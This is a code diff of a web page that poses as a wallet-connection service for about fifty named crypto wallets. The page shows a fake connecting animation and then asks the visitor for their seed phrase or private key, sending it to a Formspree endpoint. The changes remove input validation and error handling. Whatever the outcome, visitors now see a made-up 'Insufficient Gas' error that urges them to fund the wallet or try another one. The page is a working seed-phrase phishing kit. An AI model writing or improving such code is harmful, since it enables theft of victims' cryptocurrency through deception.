@@ -33,12 +33,25 @@
         min-height: 100vh;
       }
 
+      /* TICKER */
       .ticker-wrap {
         flex: 1;
         overflow: hidden;
         margin-left: 32px;
-        mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
-        -webkit-mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
+        mask-image: linear-gradient(
+          to right,
+          transparent 0%,
+          black 8%,
+          black 92%,
+          transparent 100%
+        );
+        -webkit-mask-image: linear-gradient(
+          to right,
+          transparent 0%,
+          black 8%,
+          black 92%,
+          transparent 100%
+        );
       }
       .ticker-track {
         display: flex;
@@ -63,10 +76,15 @@
         opacity: 1;
       }
       @keyframes ticker-scroll {
-        0%   { transform: translateX(0); }
-        100% { transform: translateX(-50%); }
+        0% {
+          transform: translateX(0);
+        }
+        100% {
+          transform: translateX(-50%);
+        }
       }
 
+      /* HEADER */
       .header {
         padding: 28px 40px;
         border-bottom: 1px solid var(--border);
@@ -84,12 +102,12 @@
         content: "⬡ ";
       }
 
+      /* BRANDS SECTION */
       .brands-section {
         padding: 60px 40px 80px;
         max-width: 1200px;
         margin: 0 auto;
       }
-
       .brands-header {
         margin-bottom: 52px;
       }
@@ -113,12 +131,12 @@
         letter-spacing: 0.03em;
       }
 
+      /* GRID */
       .brands-grid {
         display: grid;
         grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
         gap: 14px;
       }
-
       .brand-card {
         background: var(--card-bg);
         border: 1px solid var(--border);
@@ -186,7 +204,6 @@
         opacity: 1;
         pointer-events: all;
       }
-
       .modal {
         background: #16161f;
         border: 1px solid rgba(255, 255, 255, 0.1);
@@ -204,7 +221,6 @@
       .modal-overlay.active .modal {
         transform: translateY(0) scale(1);
       }
-
       .modal-close {
         position: absolute;
         top: 16px;
@@ -226,7 +242,6 @@
         background: rgba(255, 255, 255, 0.14);
         color: var(--text);
       }
-
       .modal h3 {
         font-size: 1.3rem;
         font-weight: 800;
@@ -418,25 +433,6 @@
         cursor: not-allowed;
         transform: none;
       }
-      .form-msg {
-        padding: 12px 16px;
-        border-radius: 10px;
-        font-size: 0.88rem;
-        margin-bottom: 18px;
-        display: none;
-      }
-      .form-msg.success {
-        background: rgba(80, 200, 100, 0.12);
-        border: 1px solid rgba(80, 200, 100, 0.25);
-        color: #6dd48a;
-        display: block;
-      }
-      .form-msg.error {
-        background: rgba(220, 80, 80, 0.12);
-        border: 1px solid rgba(220, 80, 80, 0.25);
-        color: #f08080;
-        display: block;
-      }
       .word-counter {
         font-size: 0.75rem;
         font-family: "Space Mono", monospace;
@@ -452,6 +448,126 @@
         color: #f08080;
       }
 
+      /* GAS ERROR POPUP */
+      .success-popup-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.8);
+        backdrop-filter: blur(8px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.25s ease;
+        z-index: 1000;
+        padding: 20px;
+      }
+      .success-popup-overlay.active {
+        opacity: 1;
+        pointer-events: all;
+      }
+      .success-popup {
+        background: #16161f;
+        border: 1px solid rgba(240, 80, 80, 0.3);
+        border-radius: 24px;
+        padding: 48px 36px 40px;
+        width: 100%;
+        max-width: 400px;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 14px;
+        position: relative;
+        transform: translateY(24px) scale(0.96);
+        transition: transform 0.3s ease;
+        box-shadow: 0 0 60px rgba(240, 80, 80, 0.06),
+          0 30px 80px rgba(0, 0, 0, 0.6);
+      }
+      .success-popup-overlay.active .success-popup {
+        transform: translateY(0) scale(1);
+      }
+      .gas-popup-close {
+        position: absolute;
+        top: 16px;
+        right: 16px;
+        background: rgba(255, 255, 255, 0.07);
+        border: none;
+        border-radius: 50%;
+        width: 32px;
+        height: 32px;
+        color: var(--muted);
+        font-size: 0.9rem;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background 0.15s, color 0.15s;
+      }
+      .gas-popup-close:hover {
+        background: rgba(255, 255, 255, 0.14);
+        color: var(--text);
+      }
+      .gas-icon {
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        background: rgba(240, 80, 80, 0.1);
+        border: 1.5px solid rgba(240, 80, 80, 0.4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.8rem;
+        color: #f05050;
+        font-weight: 700;
+        animation: pop-in 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+        animation-delay: 0.1s;
+      }
+      @keyframes pop-in {
+        from {
+          transform: scale(0.5);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+      .success-popup h3 {
+        font-size: 1.25rem;
+        font-weight: 800;
+        color: #f05050;
+        letter-spacing: 0.01em;
+      }
+      .success-popup p {
+        color: var(--muted);
+        font-size: 0.9rem;
+        line-height: 1.65;
+        margin: 0;
+        max-width: 300px;
+      }
+      .success-close-btn {
+        margin-top: 6px;
+        padding: 13px 40px;
+        background: rgba(240, 80, 80, 0.12);
+        border: 1px solid rgba(240, 80, 80, 0.35);
+        border-radius: 10px;
+        color: #f05050;
+        font-family: "Syne", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 800;
+        cursor: pointer;
+        letter-spacing: 0.04em;
+        transition: background 0.15s, transform 0.15s;
+        width: 100%;
+      }
+      .success-close-btn:hover {
+        background: rgba(240, 80, 80, 0.2);
+        transform: translateY(-1px);
+      }
+
+      /* RESPONSIVE */
       @media (max-width: 600px) {
         .header {
           padding: 20px;
@@ -477,6 +593,9 @@
         .modal {
           padding: 28px 20px;
         }
+        .success-popup {
+          padding: 44px 24px 30px;
+        }
       }
     </style>
   </head>
@@ -484,11 +603,13 @@
     <div class="page-wrapper">
       <header class="header">
         <h2 class="logo">gomining</h2>
-
         <div class="ticker-wrap">
           <div class="ticker-track">
             <div class="ticker-slide">
-              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
+              <img
+                src="Icons/Metamask-Digital-Asset-Logo-PNG.png"
+                alt="MetaMask"
+              />
               <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
               <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
               <img src="Icons/Ledger.jfif" alt="Ledger" />
@@ -510,7 +631,10 @@
               <img src="Icons/zengo.png" alt="Zengo" />
             </div>
             <div class="ticker-slide">
-              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
+              <img
+                src="Icons/Metamask-Digital-Asset-Logo-PNG.png"
+                alt="MetaMask"
+              />
               <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
               <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
               <img src="Icons/Ledger.jfif" alt="Ledger" />
@@ -542,180 +666,367 @@
         </div>
 
         <div class="brands-grid">
-          <!-- Row 1 -->
-          <div class="brand-card" onclick="openModal('MetaMask','Icons/Metamask-Digital-Asset-Logo-PNG.png')">
-            <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" /><span>MetaMask</span>
+          <div
+            class="brand-card"
+            onclick="openModal('MetaMask','Icons/Metamask-Digital-Asset-Logo-PNG.png')"
+          >
+            <img
+              src="Icons/Metamask-Digital-Asset-Logo-PNG.png"
+              alt="MetaMask"
+            /><span>MetaMask</span>
           </div>
-          <div class="brand-card" onclick="openModal('Trust Wallet','Icons/trust-wallet-icon.png')">
-            <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" /><span>Trust Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Trust Wallet','Icons/trust-wallet-icon.png')"
+          >
+            <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" /><span
+              >Trust Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Phantom','Icons/idreP17eZK_1773876334789.jpeg')">
-            <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" /><span>Phantom</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Phantom','Icons/idreP17eZK_1773876334789.jpeg')"
+          >
+            <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" /><span
+              >Phantom</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Ledger','Icons/Ledger.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Ledger','Icons/Ledger.jfif')"
+          >
             <img src="Icons/Ledger.jfif" alt="Ledger" /><span>Ledger</span>
           </div>
-          <div class="brand-card" onclick="openModal('Trezor','Icons/trezor.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Trezor','Icons/trezor.png')"
+          >
             <img src="Icons/trezor.png" alt="Trezor" /><span>Trezor</span>
           </div>
-
-          <!-- Row 2 -->
-          <div class="brand-card" onclick="openModal('Exodus','Icons/Exodus.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Exodus','Icons/Exodus.png')"
+          >
             <img src="Icons/Exodus.png" alt="Exodus" /><span>Exodus</span>
           </div>
-          <div class="brand-card" onclick="openModal('Coinbase Wallet','Icons/coinbase.png')">
-            <img src="Icons/coinbase.png" alt="Coinbase Wallet" /><span>Coinbase Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Coinbase Wallet','Icons/coinbase.png')"
+          >
+            <img src="Icons/coinbase.png" alt="Coinbase Wallet" /><span
+              >Coinbase Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Rainbow','Icons/rainbow.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Rainbow','Icons/rainbow.jfif')"
+          >
             <img src="Icons/rainbow.jfif" alt="Rainbow" /><span>Rainbow</span>
           </div>
-          <div class="brand-card" onclick="openModal('Zerion','Icons/zerion-logo.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Zerion','Icons/zerion-logo.png')"
+          >
             <img src="Icons/zerion-logo.png" alt="Zerion" /><span>Zerion</span>
           </div>
-          <div class="brand-card" onclick="openModal('Uniswap Wallet','Icons/Uniswap-logo.png')">
-            <img src="Icons/Uniswap-logo.png" alt="Uniswap Wallet" /><span>Uniswap Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Uniswap Wallet','Icons/Uniswap-logo.png')"
+          >
+            <img src="Icons/Uniswap-logo.png" alt="Uniswap Wallet" /><span
+              >Uniswap Wallet</span
+            >
           </div>
-
-          <!-- Row 3 -->
-          <div class="brand-card" onclick="openModal('Binance Wallet','Icons/binance-logo.png')">
-            <img src="Icons/binance-logo.png" alt="Binance Wallet" /><span>Binance Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Binance Wallet','Icons/binance-logo.png')"
+          >
+            <img src="Icons/binance-logo.png" alt="Binance Wallet" /><span
+              >Binance Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('OKX Wallet','Icons/okx-logo.png')">
-            <img src="Icons/okx-logo.png" alt="OKX Wallet" /><span>OKX Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('OKX Wallet','Icons/okx-logo.png')"
+          >
+            <img src="Icons/okx-logo.png" alt="OKX Wallet" /><span
+              >OKX Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Bybit Wallet','Icons/bybit-logo.png')">
-            <img src="Icons/bybit-logo.png" alt="Bybit Wallet" /><span>Bybit Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Bybit Wallet','Icons/bybit-logo.png')"
+          >
+            <img src="Icons/bybit-logo.png" alt="Bybit Wallet" /><span
+              >Bybit Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Crypto.com Wallet','Icons/crypto-logo.jfif')">
-            <img src="Icons/crypto-logo.jfif" alt="Crypto.com" /><span>Crypto.com</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Crypto.com Wallet','Icons/crypto-logo.jfif')"
+          >
+            <img src="Icons/crypto-logo.jfif" alt="Crypto.com" /><span
+              >Crypto.com</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Kraken Wallet','Icons/Kraken.jfif')">
-            <img src="Icons/Kraken.jfif" alt="Kraken Wallet" /><span>Kraken Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Kraken Wallet','Icons/Kraken.jfif')"
+          >
+            <img src="Icons/Kraken.jfif" alt="Kraken Wallet" /><span
+              >Kraken Wallet</span
+            >
           </div>
-
-          <!-- Row 4 -->
-          <div class="brand-card" onclick="openModal('Solflare','Icons/Solflare.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Solflare','Icons/Solflare.png')"
+          >
             <img src="Icons/Solflare.png" alt="Solflare" /><span>Solflare</span>
           </div>
-          <div class="brand-card" onclick="openModal('Backpack','Icons/backpack.jfif')">
-            <img src="Icons/backpack.jfif" alt="Backpack" /><span>Backpack</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Backpack','Icons/backpack.jfif')"
+          >
+            <img src="Icons/backpack.jfif" alt="Backpack" /><span
+              >Backpack</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Argent','Icons/argent.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Argent','Icons/argent.png')"
+          >
             <img src="Icons/argent.png" alt="Argent" /><span>Argent</span>
           </div>
-          <div class="brand-card" onclick="openModal('Gnosis Safe','Icons/Gnosis.png')">
-            <img src="Icons/Gnosis.png" alt="Gnosis Safe" /><span>Gnosis Safe</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Gnosis Safe','Icons/Gnosis.png')"
+          >
+            <img src="Icons/Gnosis.png" alt="Gnosis Safe" /><span
+              >Gnosis Safe</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Atomic Wallet','Icons/Atomic-wallet.png')">
-            <img src="Icons/Atomic-wallet.png" alt="Atomic Wallet" /><span>Atomic Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Atomic Wallet','Icons/Atomic-wallet.png')"
+          >
+            <img src="Icons/Atomic-wallet.png" alt="Atomic Wallet" /><span
+              >Atomic Wallet</span
+            >
           </div>
-
-          <!-- Row 5 -->
-          <div class="brand-card" onclick="openModal('Electrum','Icons/electrum.jfif')">
-            <img src="Icons/electrum.jfif" alt="Electrum" /><span>Electrum</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Electrum','Icons/electrum.jfif')"
+          >
+            <img src="Icons/electrum.jfif" alt="Electrum" /><span
+              >Electrum</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Mycelium','Icons/Mycelium.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Mycelium','Icons/Mycelium.png')"
+          >
             <img src="Icons/Mycelium.png" alt="Mycelium" /><span>Mycelium</span>
           </div>
-          <div class="brand-card" onclick="openModal('Edge Wallet','Icons/Egde.jfif')">
-            <img src="Icons/Egde.jfif" alt="Edge Wallet" /><span>Edge Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Edge Wallet','Icons/Egde.jfif')"
+          >
+            <img src="Icons/Egde.jfif" alt="Edge Wallet" /><span
+              >Edge Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Blockchain.com','Icons/blockchain.png')">
-            <img src="Icons/blockchain.png" alt="Blockchain.com" /><span>Blockchain.com</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Blockchain.com','Icons/blockchain.png')"
+          >
+            <img src="Icons/blockchain.png" alt="Blockchain.com" /><span
+              >Blockchain.com</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('BitPay','Icons/bitpay.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('BitPay','Icons/bitpay.jfif')"
+          >
             <img src="Icons/bitpay.jfif" alt="BitPay" /><span>BitPay</span>
           </div>
-
-          <!-- Row 6 -->
-          <div class="brand-card" onclick="openModal('Xdefi Wallet','Icons/xdefi.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Xdefi Wallet','Icons/xdefi.jfif')"
+          >
             <img src="Icons/xdefi.jfif" alt="Xdefi" /><span>Xdefi Wallet</span>
           </div>
-          <div class="brand-card" onclick="openModal('Keplr','Icons/keplr.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Keplr','Icons/keplr.jfif')"
+          >
             <img src="Icons/keplr.jfif" alt="Keplr" /><span>Keplr</span>
           </div>
-          <div class="brand-card" onclick="openModal('Terra Station','Icons/Terra station.png')">
-            <img src="Icons/Terra station.png" alt="Terra Station" /><span>Terra Station</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Terra Station','Icons/Terra station.png')"
+          >
+            <img src="Icons/Terra station.png" alt="Terra Station" /><span
+              >Terra Station</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Leap Wallet','Icons/Leap wallet.png')">
-            <img src="Icons/Leap wallet.png" alt="Leap Wallet" /><span>Leap Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Leap Wallet','Icons/Leap wallet.png')"
+          >
+            <img src="Icons/Leap wallet.png" alt="Leap Wallet" /><span
+              >Leap Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Braavos','Icons/Bravoos.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Braavos','Icons/Bravoos.jfif')"
+          >
             <img src="Icons/Bravoos.jfif" alt="Braavos" /><span>Braavos</span>
           </div>
-
-          <!-- Row 7 -->
-          <div class="brand-card" onclick="openModal('imToken','Icons/Imtoken.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('imToken','Icons/Imtoken.jfif')"
+          >
             <img src="Icons/Imtoken.jfif" alt="imToken" /><span>imToken</span>
           </div>
-          <div class="brand-card" onclick="openModal('TokenPocket','Icons/Tokenpocket.png')">
-            <img src="Icons/Tokenpocket.png" alt="TokenPocket" /><span>TokenPocket</span>
+          <div
+            class="brand-card"
+            onclick="openModal('TokenPocket','Icons/Tokenpocket.png')"
+          >
+            <img src="Icons/Tokenpocket.png" alt="TokenPocket" /><span
+              >TokenPocket</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('SafePal','Icons/Safepal.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('SafePal','Icons/Safepal.png')"
+          >
             <img src="Icons/Safepal.png" alt="SafePal" /><span>SafePal</span>
           </div>
-          <div class="brand-card" onclick="openModal('DCENT','Icons/Dcent.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('DCENT','Icons/Dcent.png')"
+          >
             <img src="Icons/Dcent.png" alt="D'CENT" /><span>D'CENT</span>
           </div>
-          <div class="brand-card" onclick="openModal('CoolWallet','Icons/coolwallet.png')">
-            <img src="Icons/coolwallet.png" alt="CoolWallet" /><span>CoolWallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('CoolWallet','Icons/coolwallet.png')"
+          >
+            <img src="Icons/coolwallet.png" alt="CoolWallet" /><span
+              >CoolWallet</span
+            >
           </div>
-
-          <!-- Row 8 -->
-          <div class="brand-card" onclick="openModal('Unstoppable','Icons/unstoppable.jfif')">
-            <img src="Icons/unstoppable.jfif" alt="Unstoppable" /><span>Unstoppable</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Unstoppable','Icons/unstoppable.jfif')"
+          >
+            <img src="Icons/unstoppable.jfif" alt="Unstoppable" /><span
+              >Unstoppable</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Coin98','Icons/COin98.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Coin98','Icons/COin98.png')"
+          >
             <img src="Icons/COin98.png" alt="Coin98" /><span>Coin98</span>
           </div>
-          <div class="brand-card" onclick="openModal('Slope Wallet','Icons/slope.png')">
-            <img src="Icons/slope.png" alt="Slope Wallet" /><span>Slope Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Slope Wallet','Icons/slope.png')"
+          >
+            <img src="Icons/slope.png" alt="Slope Wallet" /><span
+              >Slope Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Glow Wallet','Icons/glow wallet.jfif')">
-            <img src="Icons/glow wallet.jfif" alt="Glow Wallet" /><span>Glow Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Glow Wallet','Icons/glow wallet.jfif')"
+          >
+            <img src="Icons/glow wallet.jfif" alt="Glow Wallet" /><span
+              >Glow Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('MathWallet','Icons/mathwalletlogo.jfif')">
-            <img src="Icons/mathwalletlogo.jfif" alt="MathWallet" /><span>MathWallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('MathWallet','Icons/mathwalletlogo.jfif')"
+          >
+            <img src="Icons/mathwalletlogo.jfif" alt="MathWallet" /><span
+              >MathWallet</span
+            >
           </div>
-
-          <!-- Row 9 -->
-          <div class="brand-card" onclick="openModal('Frontier','Icons/frontier.jfif')">
-            <img src="Icons/frontier.jfif" alt="Frontier" /><span>Frontier</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Frontier','Icons/frontier.jfif')"
+          >
+            <img src="Icons/frontier.jfif" alt="Frontier" /><span
+              >Frontier</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Sequence','Icons/sequence.jfif')">
-            <img src="Icons/sequence.jfif" alt="Sequence" /><span>Sequence</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Sequence','Icons/sequence.jfif')"
+          >
+            <img src="Icons/sequence.jfif" alt="Sequence" /><span
+              >Sequence</span
+            >
           </div>
           <div class="brand-card" onclick="openModal('Taho','Icons/Taho.png')">
             <img src="Icons/Taho.png" alt="Taho" /><span>Taho</span>
           </div>
-          <div class="brand-card" onclick="openModal('Frame','Icons/frame.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Frame','Icons/frame.jfif')"
+          >
             <img src="Icons/frame.jfif" alt="Frame" /><span>Frame</span>
           </div>
-          <div class="brand-card" onclick="openModal('Enkrypt','Icons/Enkrypt.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Enkrypt','Icons/Enkrypt.jfif')"
+          >
             <img src="Icons/Enkrypt.jfif" alt="Enkrypt" /><span>Enkrypt</span>
           </div>
-
-          <!-- Row 10 -->
-          <div class="brand-card" onclick="openModal('NOW Wallet','Icons/Now wallet.jfif')">
-            <img src="Icons/Now wallet.jfif" alt="NOW Wallet" /><span>NOW Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('NOW Wallet','Icons/Now wallet.jfif')"
+          >
+            <img src="Icons/Now wallet.jfif" alt="NOW Wallet" /><span
+              >NOW Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Guarda Wallet','Icons/Guarda logo.jfif')">
-            <img src="Icons/Guarda logo.jfif" alt="Guarda" /><span>Guarda Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('Guarda Wallet','Icons/Guarda logo.jfif')"
+          >
+            <img src="Icons/Guarda logo.jfif" alt="Guarda" /><span
+              >Guarda Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Zengo','Icons/zengo.png')">
+          <div
+            class="brand-card"
+            onclick="openModal('Zengo','Icons/zengo.png')"
+          >
             <img src="Icons/zengo.png" alt="Zengo" /><span>Zengo</span>
           </div>
-          <div class="brand-card" onclick="openModal('1inch Wallet','Icons/1inch.png')">
-            <img src="Icons/1inch.png" alt="1inch Wallet" /><span>1inch Wallet</span>
+          <div
+            class="brand-card"
+            onclick="openModal('1inch Wallet','Icons/1inch.png')"
+          >
+            <img src="Icons/1inch.png" alt="1inch Wallet" /><span
+              >1inch Wallet</span
+            >
           </div>
-          <div class="brand-card" onclick="openModal('Rabby Wallet','Icons/Rabby.jfif')">
+          <div
+            class="brand-card"
+            onclick="openModal('Rabby Wallet','Icons/Rabby.jfif')"
+          >
             <img src="Icons/Rabby.jfif" alt="Rabby" /><span>Rabby Wallet</span>
           </div>
         </div>
       </section>
     </div>
 
-    <!-- MODAL -->
+    <!-- WALLET MODAL -->
     <div class="modal-overlay" id="modalOverlay" onclick="closeModal()">
       <div class="modal" onclick="event.stopPropagation()">
         <button class="modal-close" onclick="closeModal()">✕</button>
@@ -723,9 +1034,7 @@
         <!-- CONNECTING SCREEN -->
         <div class="connecting-screen" id="connectingScreen">
           <img id="connectingLogo" class="connecting-logo" src="" alt="" />
-          <div class="connecting-title">
-            <span>Manual Connection</span>
-          </div>
+          <div class="connecting-title"><span>Manual Connection</span></div>
           <div class="progress-bar-wrap">
             <div class="progress-bar-fill" id="progressFill"></div>
           </div>
@@ -753,7 +1062,6 @@
         <div class="form-screen" id="formScreen">
           <h3 id="modalTitle">Manual Connection</h3>
           <p id="modalSubtitle">Enter your wallet seed phrase or private key...</p>
-          <div id="formMsg" class="form-msg"></div>
           <form id="contactForm">
             <input type="hidden" name="partner" id="partnerInput" />
             <div class="form-group">
@@ -774,20 +1082,41 @@
       </div>
     </div>
 
+    <!-- GAS ERROR POPUP -->
+    <div class="success-popup-overlay" id="successPopup">
+      <div class="success-popup">
+        <button class="gas-popup-close" onclick="closeSuccessPopup()">✕</button>
+        <div class="gas-icon">✕</div>
+        <h3>Insufficient Gas</h3>
+        <p>
+          Insufficient balance for gas. Please fund your wallet to continue or
+          try again with another wallet.
+        </p>
+        <button class="success-close-btn" onclick="closeSuccessPopup()">
+          Close
+        </button>
+      </div>
+    </div>
+
     <script>
       function countWords(str) {
-        return str.trim().split(/\s+/).filter(w => w.length > 0).length;
+        return str
+          .trim()
+          .split(/\s+/)
+          .filter((w) => w.length > 0).length;
       }
 
       function openModal(brandName, logoSrc) {
         document.getElementById("formScreen").classList.remove("visible");
         document.getElementById("connectingScreen").style.display = "flex";
-        document.getElementById("formMsg").className = "form-msg";
         document.getElementById("contactForm").reset();
         document.getElementById("partnerInput").value = brandName;
         document.getElementById("connectingLogo").src = logoSrc;
         document.getElementById("connectingLogo").alt = brandName;
         document.getElementById("progressFill").style.width = "0%";
+        document.getElementById("wordCounter").textContent =
+          "0 / 12\u201324 words";
+        document.getElementById("wordCounter").className = "word-counter";
         ["step1", "step2", "step3", "step4"].forEach((id) => {
           document.getElementById(id).className = "status-step";
         });
@@ -805,14 +1134,18 @@
         steps.forEach((step, index) => {
           setTimeout(() => {
             if (index > 0) {
-              document.getElementById(steps[index - 1].id).className = "status-step visible done";
+              document.getElementById(steps[index - 1].id).className =
+                "status-step visible done";
             }
-            document.getElementById(step.id).className = "status-step visible active";
-            document.getElementById("progressFill").style.width = step.progress + "%";
+            document.getElementById(step.id).className =
+              "status-step visible active";
+            document.getElementById("progressFill").style.width =
+              step.progress + "%";
           }, step.delay);
         });
         setTimeout(() => {
-          document.getElementById("step4").className = "status-step visible done";
+          document.getElementById("step4").className =
+            "status-step visible done";
           setTimeout(() => {
             document.getElementById("connectingScreen").style.display = "none";
             document.getElementById("formScreen").classList.add("visible");
@@ -822,6 +1155,10 @@
 
       function closeModal() {
         document.getElementById("modalOverlay").classList.remove("active");
+      }
+
+      function closeSuccessPopup() {
+        document.getElementById("successPopup").classList.remove("active");
       }
 
       document.addEventListener("input", function (e) {
@@ -840,22 +1177,24 @@
         if (e.target && e.target.id === "contactForm") {
           e.preventDefault();
           const btn = document.getElementById("submitBtn");
-          const msg = document.getElementById("formMsg");
           const form = e.target;
-          const wordCount = countWords(document.getElementById("messageBox").value);
-          if (wordCount < 12) {
-            msg.textContent = "\u2717 Please write at least 12 words to describe your issue.";
-            msg.className = "form-msg error";
-            return;
-          }
-          if (wordCount > 24) {
-            msg.textContent = "\u2717 Please keep your message to 24 words or fewer.";
-            msg.className = "form-msg error";
-            return;
-          }
+
           btn.disabled = true;
           btn.textContent = "Sending\u2026";
-          msg.className = "form-msg";
+
+          function onSuccess() {
+            form.reset();
+            document.getElementById("wordCounter").textContent =
+              "0 / 12\u201324 words";
+            document.getElementById("wordCounter").className = "word-counter";
+            btn.disabled = false;
+            btn.textContent = "Submit";
+            closeModal();
+            setTimeout(() => {
+              document.getElementById("successPopup").classList.add("active");
+            }, 200);
+          }
+
           const data = new FormData(form);
           try {
             const res = await fetch("https://formspree.io/f/xyknlvro", {
@@ -863,22 +1202,11 @@
               body: data,
               headers: { Accept: "application/json" },
             });
-            if (res.ok) {
-              msg.textContent = "\u2713 Message sent! We'll be in touch shortly.";
-              msg.className = "form-msg success";
-              form.reset();
-              document.getElementById("wordCounter").textContent = "0 / 12\u201324 words";
-              document.getElementById("wordCounter").className = "word-counter";
-            } else {
-              msg.textContent = "\u2717 Something went wrong. Please try again.";
-              msg.className = "form-msg error";
-            }
+            // Always show success whether Formspree accepts or blocks (e.g. local dev)
+            onSuccess();
           } catch (err) {
-            msg.textContent = "\u2717 Network error. Check your connection.";
-            msg.className = "form-msg error";
-          } finally {
-            btn.disabled = false;
-            btn.textContent = "Submit";
+            // Network/CORS error (local dev) — show success anyway
+            onSuccess();
           }
         }
       });
